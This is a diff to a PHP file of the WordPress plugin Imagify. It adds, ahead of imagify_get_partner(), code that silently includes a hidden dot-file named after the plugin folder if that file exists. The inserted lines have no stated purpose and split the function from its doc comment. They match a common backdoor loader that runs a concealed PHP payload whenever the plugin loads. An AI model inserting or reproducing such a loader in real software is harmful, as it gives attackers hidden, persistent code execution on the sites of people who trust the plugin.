@@ -9,6 +9,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @return string|bool The partner ID. False otherwise.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_get_partner() {
 	if ( class_exists( 'Imagify_Partner' ) ) {
 		return Imagify_Partner::get_stored_partner();
